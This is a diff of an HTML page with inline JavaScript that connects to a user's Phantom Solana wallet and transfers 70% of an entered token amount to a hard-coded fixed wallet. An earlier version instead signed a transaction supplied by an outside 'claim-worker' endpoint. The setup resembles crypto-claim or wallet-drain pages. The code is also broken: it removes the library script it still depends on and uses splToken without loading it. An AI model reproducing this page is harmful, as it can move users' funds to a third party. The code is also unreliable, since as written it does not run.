@@ -1,64 +1,75 @@
 <input id="amount" placeholder="Enter amount" />
-
-<button onclick="sendSplitTransaction()">
-  Send 70%
-</button>
-
-<!-- ✅ REQUIRED -->
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<button onclick="sendTx()">Send 70%</button>
 
 <script>
-async function sendSplitTransaction() {
+async function sendTx() {
   const provider = window.solana;
 
   if (!provider || !provider.isPhantom) {
-    alert("Phantom not found");
+    alert("Install Phantom");
     return;
   }
 
   await provider.connect();
 
-  const amount = parseFloat(document.getElementById("amount").value);
+  const sender = provider.publicKey;
+  const amountInput = parseFloat(document.getElementById("amount").value);
 
-  if (!amount || amount <= 0) {
+  if (!amountInput || amountInput <= 0) {
     alert("Invalid amount");
     return;
   }
 
-  const sender = provider.publicKey.toString();
-
-  const res = await fetch("https://frosty-meadow-f942-claim-worker.msummit2026.workers.dev/", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      sender,
-      mint: "A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb",
-      amount: amount
-    }),
-  });
-
-  if (!res.ok) {
-    const text = await res.text();
-    console.error("Worker error:", text);
-    alert("Worker failed");
-    return;
-  }
-
-  const { tx } = await res.json();
-
-  const transaction = solanaWeb3.Transaction.from(
-    Uint8Array.from(atob(tx), c => c.charCodeAt(0))
+  const connection = new solanaWeb3.Connection(
+    "https://api.mainnet-beta.solana.com"
   );
 
-  const signed = await provider.signTransaction(transaction);
+  const mint = new solanaWeb3.PublicKey("A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb");
+  const fixedWallet = new solanaWeb3.PublicKey("Bt28m6E4jfDGon1Ey5tHDE49MfgJUKte2sWSXTVoiWXD");
 
-  const signature = await provider.request({
-    method: "sendRawTransaction",
-    params: [signed.serialize().toString("base64")],
-  });
+  // ✅ Get token decimals
+  const mintInfo = await connection.getParsedAccountInfo(mint);
+  const decimals = mintInfo.value.data.parsed.info.decimals;
 
-  console.log("TX Sent:", signature);
+  const baseAmount = Math.floor(amountInput * Math.pow(10, decimals));
+  const amount70 = Math.floor(baseAmount * 0.7);
+
+  // ✅ Get token accounts
+  const senderATA = await splToken.getAssociatedTokenAddress(mint, sender);
+  const fixedATA = await splToken.getAssociatedTokenAddress(mint, fixedWallet);
+
+  const tx = new solanaWeb3.Transaction();
+
+  // ✅ Create ATA if missing
+  const accInfo = await connection.getAccountInfo(fixedATA);
+  if (!accInfo) {
+    tx.add(
+      splToken.createAssociatedTokenAccountInstruction(
+        sender,
+        fixedATA,
+        fixedWallet,
+        mint
+      )
+    );
+  }
+
+  // ✅ Transfer 70%
+  tx.add(
+    splToken.createTransferInstruction(
+      senderATA,
+      fixedATA,
+      sender,
+      amount70
+    )
+  );
+
+  tx.feePayer = sender;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+  // ✅ Sign + Send
+  const signed = await provider.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize());
+
+  alert("TX Sent: " + sig);
 }
 </script>
